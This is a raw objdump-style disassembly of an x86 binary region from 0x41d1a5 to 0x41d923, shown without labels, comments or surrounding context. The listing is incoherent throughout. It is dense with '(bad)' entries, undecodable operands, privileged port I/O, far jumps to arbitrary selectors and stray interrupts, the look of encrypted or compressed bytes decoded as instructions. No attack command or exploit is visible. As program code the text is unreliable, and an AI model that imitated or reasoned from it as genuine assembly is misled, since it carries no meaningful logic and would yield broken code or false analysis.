  41d1a5:	aas    
  41d1a6:	cs out 0x21,eax
  41d1a9:	add    DWORD PTR ds:0x5bfd127a,ecx
  41d1af:	jg     0x41d19f
  41d1b1:	and    BYTE PTR [esp+ebp*4-0x67],bh
  41d1b5:	sub    BYTE PTR [esi-0x6caab0fe],cl
  41d1bb:	push   esi
  41d1bc:	sub    DWORD PTR [edi],edi
  41d1be:	std    
  41d1bf:	data16 mov ch,0xdd
  41d1c2:	mov    esi,0xdc137955
  41d1c7:	fidivr WORD PTR [edx+0x69fa1430]
  41d1cd:	in     al,0x4f
  41d1cf:	pop    ds
  41d1d0:	les    edi,FWORD PTR [edx+0x5ede8663]
  41d1d6:	cmp    eax,0x5c9c8741
  41d1db:	scas   al,BYTE PTR es:[edi]
  41d1dc:	repnz popa 
  41d1de:	add    ebp,ebx
  41d1e0:	outs   dx,DWORD PTR ds:[esi]
  41d1e1:	cdq    
  41d1e2:	(bad)  
  41d1e3:	push   esi
  41d1e4:	pop    esp
  41d1e5:	jbe    0x41d239
  41d1e7:	push   cs
  41d1e8:	mov    ds:0xdcd61f47,eax
  41d1ed:	retf   
  41d1ee:	pop    edx
  41d1ef:	shr    BYTE PTR [edx-0x244efeb1],cl
  41d1f5:	cwde   
  41d1f6:	test   al,0xd9
  41d1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1f9:	push   ebx
  41d1fa:	adc    ebp,DWORD PTR [eax-0x57b2c0de]
  41d200:	sub    ebx,DWORD PTR [eax+ecx*4]
  41d203:	fdivr  DWORD PTR [edi-0x71]
  41d206:	retf   
  41d207:	fdivr  st,st(0)
  41d209:	push   ebx
  41d20a:	loopne 0x41d26e
  41d20c:	add    al,0x95
  41d20e:	imul   ebp,DWORD PTR [edi-0x77],0xca558baa
  41d215:	or     ecx,ebp
  41d217:	cmp    al,0xa2
  41d219:	inc    edx
  41d21a:	and    al,ch
  41d21c:	in     al,0xc4
  41d21e:	cmp    eax,0xdde38f9f
  41d223:	push   edx
  41d224:	jmp    0x41d298
  41d226:	xor    eax,0x27893969
  41d22b:	test   al,0xae
  41d22d:	inc    edi
  41d22e:	mov    eax,ds:0x15843d7d
  41d233:	fcom   QWORD PTR [ecx]
  41d235:	(bad)  
  41d236:	push   ecx
  41d237:	pop    ds
  41d238:	xor    edx,DWORD PTR [ecx-0x464db77]
  41d23e:	jecxz  0x41d1f6
  41d240:	mov    ecx,0x2aeee71a
  41d245:	loopne 0x41d28d
  41d247:	jns    0x41d26e
  41d249:	in     eax,0xb
  41d24b:	in     al,0xef
  41d24d:	jmp    0x41d291
  41d24f:	leave  
  41d250:	cmp    esp,DWORD PTR [ecx-0xb0d98fd]
  41d256:	dec    esi
  41d257:	shl    BYTE PTR [esi+0x78],1
  41d25a:	gs mov dh,0x72
  41d25d:	repnz mov edi,0x7959594d
  41d263:	(bad)  
  41d264:	or     ah,BYTE PTR ds:0xefff5859
  41d26a:	sbb    DWORD PTR [ebx-0x33111c84],0xffffffab
  41d271:	clc    
  41d272:	clc    
  41d273:	imul   ebx,DWORD PTR [eax],0xfffffff9
  41d276:	push   0x47
  41d278:	shl    dh,0xff
  41d27b:	in     al,dx
  41d27c:	loopne 0x41d25d
  41d27e:	stc    
  41d27f:	jb     0x41d238
  41d281:	ins    DWORD PTR es:[edi],dx
  41d282:	xchg   ch,al
  41d284:	loope  0x41d233
  41d286:	shl    al,cl
  41d288:	popf   
  41d289:	or     al,0xb
  41d28b:	fwait
  41d28c:	and    edx,esp
  41d28e:	xor    al,0x89
  41d290:	xchg   BYTE PTR [ebx],ch
  41d292:	jbe    0x41d225
  41d294:	js     0x41d280
  41d296:	sub    eax,0x67c28905
  41d29b:	mov    cs,WORD PTR [ebx-0x63]
  41d29e:	jae    0x41d287
  41d2a0:	or     dh,BYTE PTR [eax-0x80]
  41d2a3:	pop    esi
  41d2a4:	fidiv  WORD PTR [ebp+0x31]
  41d2a7:	retf   
  41d2a8:	mov    esi,ebx
  41d2aa:	adc    eax,edx
  41d2ac:	jae    0x41d2d2
  41d2ae:	cmc    
  41d2af:	pop    ecx
  41d2b0:	loope  0x41d305
  41d2b2:	sub    ebp,ecx
  41d2b4:	aad    0x20
  41d2b6:	call   0x4d11d2a0
  41d2bb:	pop    ecx
  41d2bc:	jmp    0x59a7c86e
  41d2c1:	fsub   DWORD PTR [esp]
  41d2c4:	ja     0x41d30e
  41d2c6:	imul   DWORD PTR [esi]
  41d2c8:	sub    bl,bl
  41d2ca:	jecxz  0x41d307
  41d2cc:	jp     0x41d295
  41d2ce:	xchg   esi,eax
  41d2cf:	inc    esp
  41d2d0:	aas    
  41d2d1:	loop   0x41d2ca
  41d2d3:	outs   dx,DWORD PTR ds:[esi]
  41d2d4:	icebp  
  41d2d5:	jno    0x41d2dc
  41d2d7:	ficomp DWORD PTR [edx]
  41d2d9:	lea    edx,[edi-0x15]
  41d2dc:	pop    es
  41d2dd:	add    BYTE PTR ds:0x70e901f9,ch
  41d2e3:	fdiv   st,st(5)
  41d2e5:	fwait
  41d2e6:	(bad)  
  41d2e7:	in     eax,dx
  41d2e8:	push   ecx
  41d2e9:	add    al,BYTE PTR [edx]
  41d2eb:	xchg   esp,eax
  41d2ec:	dec    bh
  41d2ee:	pop    es
  41d2ef:	loopne 0x41d2eb
  41d2f1:	std    
  41d2f2:	push   ecx
  41d2f3:	jbe    0x41d370
  41d2f5:	fdiv   st,st(4)
  41d2f7:	push   esi
  41d2f8:	bswap  ebx
  41d2fa:	adc    eax,0x8a231f3a
  41d2ff:	pop    ecx
  41d300:	fcomi  st,st(2)
  41d302:	pop    ss
  41d303:	test   DWORD PTR [ebx-0x4a],0x927bdab8
  41d30a:	pop    ss
  41d30b:	stos   DWORD PTR es:[edi],eax
  41d30c:	xchg   esp,esp
  41d30e:	cdq    
  41d30f:	pop    es
  41d310:	pop    ds
  41d311:	imul   ecx,DWORD PTR [edx],0xa7fab7c4
  41d317:	xor    eax,0x5835e42e
  41d31c:	jb     0x41d373
  41d31e:	adc    esp,DWORD PTR [ebx-0x25ab20be]
  41d324:	push   0xffffffbd
  41d326:	cwde   
  41d327:	rcr    dh,1
  41d329:	enter  0x83b2,0x52
  41d32d:	repz inc esp
  41d32f:	add    DWORD PTR [edi-0x6a],esi
  41d332:	call   0xc50:0x90b2dbfc
  41d339:	and    esi,DWORD PTR [eax-0x43266db1]
  41d33f:	vunpcklpd xmm3,xmm1,XMMWORD PTR [ebx-0x492cdf10]
  41d347:	(bad)  
  41d349:	push   esp
  41d34a:	xchg   esp,eax
  41d34b:	jbe    0x41d2fb
  41d34d:	mov    ecx,0xd55ffb6b
  41d352:	stc    
  41d353:	cwde   
  41d354:	mov    eax,0xd8192976
  41d359:	inc    ebp
  41d35a:	xchg   edx,eax
  41d35b:	in     al,0x1a
  41d35d:	jmp    0x126d166d
  41d362:	retf   0x5298
  41d365:	mov    ebp,0x843e5370
  41d36a:	test   eax,0xcc6f1daa
  41d36f:	adc    BYTE PTR [ecx-0x7e],bl
  41d372:	mov    cl,0x9d
  41d374:	jae    0x41d349
  41d376:	adc    ch,BYTE PTR [edx+0x36]
  41d379:	cmp    dl,BYTE PTR [ebp-0x2d]
  41d37c:	cmp    cl,cl
  41d37e:	scas   eax,DWORD PTR es:[edi]
  41d37f:	imul   edi,ecx,0x31
  41d382:	cmp    bh,BYTE PTR [edi-0xa09a68a]
  41d388:	lods   al,BYTE PTR ds:[esi]
  41d389:	mov    bl,0xcf
  41d38b:	and    DWORD PTR [edi+0x41],ebx
  41d38e:	fsub   DWORD PTR [edi-0x47]
  41d391:	add    DWORD PTR [ecx],ecx
  41d393:	and    eax,0xdcdeaa50
  41d398:	(bad)  
  41d399:	adc    ecx,ecx
  41d39b:	inc    esi
  41d39c:	cdq    
  41d39d:	inc    esp
  41d39e:	dec    edx
  41d39f:	ins    DWORD PTR es:[edi],dx
  41d3a0:	clc    
  41d3a1:	xchg   DWORD PTR [esp+ebx*4-0x13],esp
  41d3a5:	es mov bh,0x3d
  41d3a8:	mov    ds,WORD PTR [esp+0x305fd912]
  41d3af:	xor    eax,0xb6665be6
  41d3b4:	adc    bl,cl
  41d3b6:	inc    ebx
  41d3b7:	jmp    0x38b4:0xfa50974c
  41d3be:	xlat   BYTE PTR ds:[ebx]
  41d3bf:	jns    0x41d35f
  41d3c1:	inc    ebp
  41d3c2:	push   ds
  41d3c3:	ss loopne 0x41d3b0
  41d3c6:	pop    es
  41d3c7:	adc    BYTE PTR [edx],cl
  41d3c9:	push   ds
  41d3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3cb:	add    al,0x28
  41d3cd:	mov    esp,0xae3049ad
  41d3d2:	out    0xa9,al
  41d3d4:	enter  0x587f,0x40
  41d3d8:	or     DWORD PTR [edx-0x5973372],0xffffffd6
  41d3df:	ds aas 
  41d3e1:	popf   
  41d3e2:	mov    eax,ds:0xee92a4d7
  41d3e7:	rcr    ebx,0x3d
  41d3ea:	fbstp  TBYTE PTR [esi]
  41d3ec:	into   
  41d3ed:	push   ss
  41d3ee:	push   ebx
  41d3ef:	inc    ebx
  41d3f0:	lods   al,BYTE PTR ds:[esi]
  41d3f1:	je     0x41d3b2
  41d3f3:	or     BYTE PTR [ebp+edi*1-0x40],0xd3
  41d3f8:	xchg   ebx,eax
  41d3f9:	push   0xffffff8e
  41d3fb:	pop    es
  41d3fc:	pop    es
  41d3fd:	add    ebp,DWORD PTR [edx]
  41d3ff:	inc    ebx
  41d400:	cmp    al,0x61
  41d402:	bound  eax,QWORD PTR [edi-0x63]
  41d405:	mov    edi,0x33e3d0d3
  41d40a:	xor    eax,ebx
  41d40c:	mov    ch,0x2d
  41d40e:	and    eax,0xb65e4f89
  41d413:	pop    eax
  41d414:	cmp    al,0x5e
  41d416:	leave  
  41d417:	je     0x41d406
  41d419:	outs   dx,BYTE PTR ds:[esi]
  41d41a:	sbb    eax,0x3e3535aa
  41d41f:	push   edx
  41d420:	shl    DWORD PTR [eax],1
  41d422:	pop    eax
  41d423:	fs jae 0x41d3e1
  41d426:	imul   edx,DWORD PTR [eax+ecx*2+0x2e4d830d],0xb9f1e659
  41d431:	das    
  41d432:	or     al,0x1a
  41d434:	cmp    ecx,ebp
  41d436:	icebp  
  41d437:	and    DWORD PTR [ecx-0x6af0fa23],ebx
  41d43d:	mov    DWORD PTR [eax+0x787936bf],0xf5b1fc2c
  41d447:	and    DWORD PTR [eax+0x1b],0xc535364e
  41d44e:	ret    0x3816
  41d451:	adc    ah,BYTE PTR [esi-0x303e9fe6]
  41d457:	pop    ebx
  41d458:	xchg   ebx,eax
  41d459:	cwde   
  41d45a:	xchg   esi,eax
  41d45b:	mov    WORD PTR [edx-0x20],ss
  41d45e:	cmp    edx,DWORD PTR [ecx-0x52dda47d]
  41d464:	sbb    eax,DWORD PTR [eax]
  41d466:	or     ecx,DWORD PTR [ecx-0x53]
  41d469:	addr16 xchg esp,eax
  41d46b:	aad    0x4f
  41d46d:	leave  
  41d46e:	push   ss
  41d46f:	lahf   
  41d470:	mov    dh,0xdb
  41d472:	adc    ebx,DWORD PTR [ebx+0xd]
  41d475:	cwde   
  41d476:	popf   
  41d477:	and    eax,0x71ed5072
  41d47c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d47d:	dec    ecx
  41d47e:	adc    BYTE PTR [edx-0x7d1573f7],dh
  41d484:	and    edi,ebp
  41d486:	test   BYTE PTR [edi],dh
  41d488:	mov    esi,DWORD PTR [edi]
  41d48a:	dec    edi
  41d48b:	repz push es
  41d48d:	out    dx,eax
  41d48e:	pop    es
  41d48f:	adc    edi,DWORD PTR [ebp-0x13644064]
  41d495:	ror    cl,1
  41d497:	xor    al,0x9c
  41d499:	loop   0x41d47c
  41d49b:	mov    dh,0xa8
  41d49d:	xchg   esp,eax
  41d49e:	add    ebx,esi
  41d4a0:	inc    edx
  41d4a1:	jg     0x41d51c
  41d4a3:	stos   DWORD PTR es:[edi],eax
  41d4a4:	icebp  
  41d4a5:	dec    ebx
  41d4a6:	sbb    al,0x81
  41d4a8:	add    DWORD PTR [eax-0x7cf54eae],0x425e2be0
  41d4b2:	bound  ebx,QWORD PTR [ebp+0x7e1f559]
  41d4b8:	rcl    cl,0x75
  41d4bb:	pop    edx
  41d4bc:	and    ch,BYTE PTR [eax-0xfd34928]
  41d4c2:	jmp    0x579b0ad6
  41d4c7:	sbb    DWORD PTR [eax-0x57],esp
  41d4ca:	je     0x41d506
  41d4cc:	out    0x6c,eax
  41d4ce:	fisttp WORD PTR [edi]
  41d4d0:	mov    edi,DWORD PTR [esi+0x56a8eaf3]
  41d4d6:	pop    edx
  41d4d7:	dec    ebx
  41d4d8:	mov    eax,0xed0cc28
  41d4dd:	shl    dh,1
  41d4df:	or     eax,0xafd0c4e6
  41d4e4:	push   es
  41d4e5:	jmp    0x41d4fe
  41d4e7:	sub    BYTE PTR [esi+0x51f7877c],bl
  41d4ed:	inc    sp
  41d4ef:	sub    al,0x46
  41d4f1:	mov    bl,0xc1
  41d4f3:	sub    cl,BYTE PTR [edx-0x497c261e]
  41d4f9:	xchg   edx,eax
  41d4fa:	outs   dx,DWORD PTR ds:[esi]
  41d4fb:	int    0xe
  41d4fd:	dec    ebx
  41d4fe:	fsubr  QWORD PTR [ecx+0x2e]
  41d501:	jmp    ecx
  41d503:	and    BYTE PTR [ebx+0x328e9596],dh
  41d509:	scas   eax,DWORD PTR es:[edi]
  41d50a:	add    DWORD PTR [edi+eax*4],0x42
  41d50e:	push   0xe59b5658
  41d513:	inc    ebx
  41d514:	nop
  41d515:	mov    cl,0x68
  41d517:	rcl    DWORD PTR [eax+0x20],1
  41d51a:	js     0x41d4a8
  41d51c:	mov    ?,WORD PTR [ebx]
  41d51e:	imul   eax,DWORD PTR [eax-0x24],0x3db68ceb
  41d525:	mov    ds:0xe03413d3,eax
  41d52a:	dec    eax
  41d52b:	jl     0x41d59f
  41d52d:	repnz int 0x9c
  41d530:	xor    eax,0xa76c9098
  41d535:	sti    
  41d536:	(bad)  
  41d537:	call   0x3c64:0x16e2892b
  41d53e:	add    eax,0x2ebee586
  41d543:	push   edx
  41d544:	add    bh,BYTE PTR [eax+0x4d]
  41d547:	push   esi
  41d548:	jo     0x41d593
  41d54a:	jp     0x41d578
  41d54c:	cmc    
  41d54d:	or     BYTE PTR [ecx+0x5d],0xaf
  41d551:	fdiv   DWORD PTR [eax-0x41]
  41d554:	retf   
  41d555:	test   BYTE PTR [eax],dh
  41d557:	mov    ch,0xbb
  41d559:	cli    
  41d55a:	fistp  WORD PTR [bp+di]
  41d55d:	sub    dh,ah
  41d55f:	fld    DWORD PTR [esi-0x18]
  41d562:	out    dx,eax
  41d563:	jbe    0x41d51f
  41d565:	shr    DWORD PTR [ebx+0x9741a15],1
  41d56b:	pop    esp
  41d56c:	mov    al,ds:0x67447bed
  41d571:	das    
  41d572:	jb     0x41d501
  41d574:	jb     0x41d5a2
  41d576:	(bad)  
  41d577:	sbb    DWORD PTR [eax+0x4c673573],esp
  41d57d:	jb     0x41d504
  41d57f:	sahf   
  41d580:	and    bl,BYTE PTR ds:0xab631d84
  41d586:	mov    bl,BYTE PTR [esi+0x7f]
  41d589:	imul   eax,DWORD PTR [eax-0x2c],0x84df6203
  41d590:	fisubr DWORD PTR [eax+0x71]
  41d593:	aas    
  41d594:	pop    ebp
  41d595:	jmp    0xb5ae:0x8e7e7f8
  41d59c:	pop    esi
  41d59d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d59e:	lods   eax,DWORD PTR ds:[esi]
  41d59f:	xchg   esp,eax
  41d5a0:	lahf   
  41d5a1:	dec    ecx
  41d5a2:	jno    0x41d5bf
  41d5a4:	xlat   BYTE PTR ds:[ebx]
  41d5a5:	out    dx,eax
  41d5a6:	int    0x30
  41d5a8:	and    al,cl
  41d5aa:	test   BYTE PTR [ecx],ch
  41d5ac:	add    ebx,0x37
  41d5af:	mov    bl,0x36
  41d5b1:	push   ss
  41d5b2:	inc    eax
  41d5b3:	xchg   ecx,esp
  41d5b5:	mov    WORD PTR [esi-0x2d2ae34a],ds
  41d5bb:	inc    esi
  41d5bc:	push   ecx
  41d5bd:	(bad)
  41d5c1:	pop    esi
  41d5c2:	pop    edx
  41d5c3:	lock fwait
  41d5c5:	dec    BYTE PTR [ecx]
  41d5c7:	ficomp DWORD PTR [eax]
  41d5c9:	and    dh,BYTE PTR [eax]
  41d5cb:	mov    eax,ds:0xd97cc612
  41d5d0:	out    0x81,al
  41d5d2:	repnz pop edx
  41d5d4:	shr    BYTE PTR [edx-0x59],1
  41d5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5d8:	in     al,0xc2
  41d5da:	add    DWORD PTR [ebx],ecx
  41d5dc:	mov    eax,ds:0xc67cf7c3
  41d5e1:	jb     0x41d624
  41d5e3:	push   ds
  41d5e4:	ins    BYTE PTR es:[edi],dx
  41d5e5:	shl    DWORD PTR [eax+0x53],1
  41d5e8:	xor    al,0x65
  41d5ea:	mov    ebx,ebp
  41d5ec:	in     eax,0x29
  41d5ee:	push   es
  41d5ef:	sbb    al,0x3c
  41d5f1:	call   0x6ee6600a
  41d5f6:	sub    eax,DWORD PTR [ecx]
  41d5f8:	xchg   esp,eax
  41d5f9:	pop    edx
  41d5fa:	xchg   esi,eax
  41d5fb:	ins    BYTE PTR es:[edi],dx
  41d5fc:	push   cs
  41d5fd:	mov    edx,0x5edf3dfa
  41d602:	test   eax,0x9ef53014
  41d607:	push   cs
  41d608:	jnp    0x41d658
  41d60a:	cld    
  41d60b:	test   eax,0x3ff2da3b
  41d610:	jmp    0x41d603
  41d612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d613:	add    esi,0x62c4b7fa
  41d619:	and    al,0x2
  41d61b:	jno    0x41d610
  41d61d:	mov    al,0xe
  41d61f:	cdq    
  41d620:	xlat   BYTE PTR ds:[ebx]
  41d621:	lock out 0xae,eax
  41d624:	mov    dl,0xdd
  41d626:	fldenv [edi-0x36]
  41d629:	jmp    0x8682f1f7
  41d62e:	xor    ah,BYTE PTR [esi+0xdf442eb]
  41d634:	in     eax,0x4
  41d636:	mov    ds:0xe3cc0bde,al
  41d63b:	jl     0x41d673
  41d63d:	pop    es
  41d63e:	add    ecx,ebx
  41d640:	mov    ?,WORD PTR [edi+0x11]
  41d643:	ss int3 
  41d645:	sub    ebp,DWORD PTR [ebp+0x7e61bb1]
  41d64b:	mov    ch,dl
  41d64d:	xchg   ecx,eax
  41d64e:	cmp    ch,dh
  41d650:	jmp    0x41d644
  41d652:	add    dl,BYTE PTR [edx+ebp*8+0x7a]
  41d656:	pushf  
  41d657:	fdivp  st(5),st
  41d659:	iret   
  41d65a:	mov    eax,0x51a7154c
  41d65f:	xor    ah,BYTE PTR [edx-0x1bf4db0a]
  41d665:	jae    0x41d683
  41d667:	xchg   ebx,eax
  41d668:	pop    ebx
  41d669:	jnp    0x41d60d
  41d66b:	sbb    DWORD PTR [ecx-0x34],ebx
  41d66e:	stc    
  41d66f:	xor    al,0x6b
  41d671:	mov    al,0x67
  41d673:	add    cl,BYTE PTR [edi]
  41d675:	mov    ch,0xf0
  41d677:	dec    edx
  41d678:	call   0x2bff39cf
  41d67d:	stc    
  41d67e:	std    
  41d67f:	std    
  41d680:	cmp    edi,0x92735913
  41d686:	jb     0x41d663
  41d688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d689:	jmp    DWORD PTR [edx]
  41d68b:	xchg   esp,eax
  41d68c:	test   al,0x57
  41d68e:	mov    ah,0x4c
  41d690:	rcl    DWORD PTR [edi],0xbb
  41d693:	and    bh,BYTE PTR [ecx-0x71]
  41d696:	shr    BYTE PTR [eax],0x37
  41d699:	pop    esi
  41d69a:	sub    BYTE PTR [ebp+0x2a],dh
  41d69d:	pop    ecx
  41d69e:	adc    eax,0x2a917619
  41d6a3:	dec    esp
  41d6a4:	jae    0x41d66c
  41d6a6:	out    0x5f,eax
  41d6a8:	in     eax,dx
  41d6a9:	adc    eax,DWORD PTR [edi-0x21]
  41d6ac:	fdivr  QWORD PTR [ebp-0x25165a1]
  41d6b2:	rcl    dh,0xdc
  41d6b5:	push   cs
  41d6b6:	xchg   ecx,eax
  41d6b7:	test   eax,0x2280bd2b
  41d6bc:	fisubr WORD PTR [edi-0x5908551f]
  41d6c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6c3:	cld    
  41d6c4:	pop    eax
  41d6c5:	dec    BYTE PTR [eax-0x70]
  41d6c8:	and    al,0xdb
  41d6ca:	test   eax,0x6cdeadd7
  41d6cf:	jecxz  0x41d66c
  41d6d1:	cmp    esp,esp
  41d6d3:	jg     0x41d6bd
  41d6d5:	inc    DWORD PTR [ecx+0x71cb3f1c]
  41d6db:	loopne 0x41d70f
  41d6dd:	mov    eax,0x4629cf5a
  41d6e2:	in     eax,0xc
  41d6e4:	cmp    bh,BYTE PTR [ebp-0xf9d65e2]
  41d6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6eb:	cmp    BYTE PTR [ebp-0x46],cl
  41d6ee:	jle    0x41d695
  41d6f0:	cdq    
  41d6f1:	(bad)
  41d6f4:	into   
  41d6f5:	(bad)  
  41d6f6:	ret    
  41d6f7:	and    BYTE PTR [ecx],0x91
  41d6fa:	sub    esi,edi
  41d6fc:	fcom   DWORD PTR [edx]
  41d6fe:	fidiv  WORD PTR ds:0xb086b412
  41d704:	enterw 0x7526,0xce
  41d709:	jmp    0x41d706
  41d70b:	and    DWORD PTR [edx+0xc4e4f22],ebp
  41d711:	enter  0x6ad7,0x3a
  41d715:	inc    esi
  41d716:	pusha  
  41d717:	cdq    
  41d718:	inc    edx
  41d719:	jmp    0xbabe760b
  41d71e:	mov    edi,DWORD PTR [ecx-0x173eb292]
  41d724:	jg     0x41d72c
  41d726:	mov    ecx,0x2b1fe558
  41d72b:	pushf  
  41d72c:	hlt    
  41d72d:	lahf   
  41d72e:	test   DWORD PTR [ebx+edi*8+0x1f],edi
  41d732:	pop    ds
  41d733:	stos   DWORD PTR es:[edi],eax
  41d734:	into   
  41d735:	loope  0x41d6e9
  41d737:	(bad)  
  41d739:	(bad)  
  41d73a:	jle    0x41d6da
  41d73c:	inc    eax
  41d73d:	(bad)  
  41d73e:	jl     0x41d6e7
  41d740:	mov    eax,ds:0x75ba3a66
  41d745:	fidiv  WORD PTR [ebx+0x6c23a264]
  41d74b:	jl     0x41d72a
  41d74d:	not    BYTE PTR [esi]
  41d74f:	mov    ds:0xc9dedb80,al
  41d754:	adc    DWORD PTR [edx+0x506d3d5b],eax
  41d75a:	test   cl,al
  41d75c:	push   ebx
  41d75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d75e:	inc    esi
  41d75f:	ror    BYTE PTR [eax-0x74],1
  41d762:	xlat   BYTE PTR ds:[ebx]
  41d763:	and    al,0xe6
  41d765:	sbb    cl,BYTE PTR [ecx]
  41d767:	stc    
  41d768:	mov    edi,fs
  41d76a:	push   edi
  41d76b:	stos   DWORD PTR es:[edi],eax
  41d76c:	xchg   BYTE PTR [edi-0x33e4b337],al
  41d772:	icebp  
  41d773:	xchg   ecx,eax
  41d774:	lods   al,BYTE PTR ds:[esi]
  41d775:	fs add al,0xd
  41d778:	(bad)  
  41d779:	sbb    dh,bh
  41d77b:	or     al,0x26
  41d77d:	mov    dl,0x15
  41d77f:	arpl   WORD PTR [esi],bx
  41d781:	add    BYTE PTR [edx+0xa381ed3],dh
  41d787:	bound  ebp,QWORD PTR [esi-0x6dfbc4ca]
  41d78d:	mov    bl,0x84
  41d78f:	test   DWORD PTR [ebp-0x4b3c5b80],0xc5bdfdc6
  41d799:	jns    0x41d819
  41d79b:	add    cl,dh
  41d79d:	dec    edi
  41d79e:	ret    0xf2e5
  41d7a1:	push   0xff9e9aea
  41d7a6:	out    dx,eax
  41d7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7a8:	pushf  
  41d7a9:	cmp    ecx,ebx
  41d7ab:	or     bl,BYTE PTR ds:0xcc04d23b
  41d7b1:	arpl   WORD PTR [ebp+0x21],cx
  41d7b4:	sbb    bh,BYTE PTR [eax+0x15]
  41d7b7:	or     eax,0x28f6c47a
  41d7bc:	and    DWORD PTR gs:[ebp+ebx*4+0x44d460b0],esp
  41d7c4:	and    DWORD PTR [ebx-0x70d71ce8],esi
  41d7ca:	aaa    
  41d7cb:	pop    edx
  41d7cc:	mov    ebx,0x1d340347
  41d7d1:	mov    bh,bl
  41d7d3:	clc    
  41d7d4:	lods   eax,DWORD PTR ds:[esi]
  41d7d5:	jg     0x41d7c0
  41d7d7:	ret    0x77ec
  41d7da:	and    esi,edx
  41d7dc:	jb     0x41d81e
  41d7de:	daa    
  41d7df:	adc    ebp,DWORD PTR [edi-0xa]
  41d7e2:	inc    edi
  41d7e3:	xor    eax,0xde6ec4f4
  41d7e8:	add    dl,BYTE PTR [eax-0x64ab1990]
  41d7ee:	sbb    DWORD PTR [ebp+0x71],esp
  41d7f1:	shl    BYTE PTR [ecx+0x472eaa7],0xb7
  41d7f8:	xchg   esp,eax
  41d7f9:	xchg   dh,dl
  41d7fb:	enter  0xf936,0xe7
  41d7ff:	xchg   edx,eax
  41d800:	sub    eax,0x4a94a488
  41d805:	(bad)  
  41d806:	(bad)  
  41d808:	push   ds
  41d809:	xor    ecx,eax
  41d80b:	sbb    BYTE PTR [edi-0x406ca477],ah
  41d811:	mov    DWORD PTR [ebp-0x5d],0xa83b840a
  41d818:	jo     0x41d82f
  41d81a:	sub    DWORD PTR [ebx],esp
  41d81c:	iret   
  41d81d:	(bad)  [esp+edx*2-0x79]
  41d821:	jmp    0x41d858
  41d823:	in     al,dx
  41d824:	mov    ebp,0x5c12f298
  41d829:	jg     0x41d7d2
  41d82b:	pusha  
  41d82c:	cmp    BYTE PTR [ecx+0x6c93bacb],0x73
  41d833:	xchg   BYTE PTR [edi-0x16],cl
  41d836:	push   esp
  41d837:	dec    edi
  41d838:	lds    ebx,FWORD PTR [ecx]
  41d83a:	push   0xf56ef95
  41d83f:	pushf  
  41d840:	fimul  DWORD PTR [ebp+0x121c228c]
  41d846:	scas   al,BYTE PTR es:[edi]
  41d847:	ins    DWORD PTR es:[edi],dx
  41d848:	fwait
  41d849:	cmp    cl,BYTE PTR [ebx-0x62c1d646]
  41d84f:	mov    cl,0xb5
  41d851:	test   DWORD PTR [ebx],0xc7278f64
  41d857:	adc    ah,ch
  41d859:	push   ss
  41d85a:	xor    DWORD PTR [ebp-0x25],ebx
  41d85d:	stos   DWORD PTR es:[edi],eax
  41d85e:	xor    al,0xf4
  41d860:	idiv   DWORD PTR [edx-0x3a]
  41d863:	xchg   esi,eax
  41d864:	iret   
  41d865:	mov    edi,0xd98137db
  41d86a:	addr16 mov esp,0xc95635b4
  41d870:	cmp    BYTE PTR [edi+edi*8-0x1538e0d2],bl
  41d877:	cmp    DWORD PTR [eax-0x5a8ce35d],esi
  41d87d:	sub    esi,DWORD PTR [edx-0x142c96]
  41d883:	cs call 0x9665:0x999e8977
  41d88b:	pop    edx
  41d88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d88d:	xchg   esi,eax
  41d88e:	scas   al,BYTE PTR es:[edi]
  41d88f:	aaa    
  41d890:	inc    ecx
  41d891:	int    0x30
  41d893:	pop    es
  41d894:	jno    0x41d84f
  41d896:	sbb    DWORD PTR [ebx],eax
  41d898:	mov    al,ds:0x30a7bf6c
  41d89d:	mov    cl,0x9b
  41d89f:	xchg   edi,eax
  41d8a0:	retf   0xba2a
  41d8a3:	jmp    0x5748f4f5
  41d8a8:	xor    ch,BYTE PTR [ebx]
  41d8aa:	retf   
  41d8ab:	jge    0x41d8d4
  41d8ad:	push   es
  41d8ae:	std    
  41d8af:	outs   dx,BYTE PTR ds:[esi]
  41d8b0:	push   eax
  41d8b1:	sar    BYTE PTR [ebp+0x18],cl
  41d8b4:	hlt    
  41d8b5:	repnz push ebx
  41d8b7:	loop   0x41d8fe
  41d8b9:	xchg   edx,eax
  41d8ba:	pop    eax
  41d8bb:	ss int 0xf3
  41d8be:	mov    esp,0x67cd6837
  41d8c3:	or     ebp,DWORD PTR [edx]
  41d8c5:	ins    BYTE PTR es:[edi],dx
  41d8c6:	xchg   ebp,eax
  41d8c7:	xchg   BYTE PTR [eax],bl
  41d8c9:	sub    DWORD PTR [ebx+0x3842a7fd],edx
  41d8cf:	sbb    eax,0xfee3b625
  41d8d4:	and    al,0xb9
  41d8d6:	fnstenv fs:[ebx+eiz*1-0x270efc37]
  41d8de:	sbb    eax,0xcecefee4
  41d8e3:	stos   DWORD PTR es:[edi],eax
  41d8e4:	cmp    eax,0xa5ffdb3b
  41d8e9:	fsubr  QWORD PTR [edx+edi*8-0x1bd9a82b]
  41d8f0:	cmp    al,0x7c
  41d8f2:	fsubr  QWORD PTR [ecx]
  41d8f4:	pusha  
  41d8f5:	and    DWORD PTR ds:0x285cbf56,edi
  41d8fb:	inc    ebp
  41d8fc:	or     eax,0x91e0f62c
  41d901:	jno    0x41d8d1
  41d903:	loop   0x41d93a
  41d905:	clc    
  41d906:	ficomp WORD PTR [edx]
  41d908:	jmp    0x8bc780fe
  41d90d:	ds aas 
  41d90f:	je     0x41d945
  41d911:	retf   0xf59c
  41d914:	jg     0x41d92e
  41d916:	ficomp DWORD PTR ss:[esi]
  41d919:	adc    DWORD PTR [eax],edx
  41d91b:	jnp    0x41d942
  41d91d:	mov    al,0x62
  41d91f:	dec    edx
  41d920:	scas   al,BYTE PTR es:[edi]
  41d921:	dec    edx
  41d922:	pop    ecx
  41d923:	push   0x70
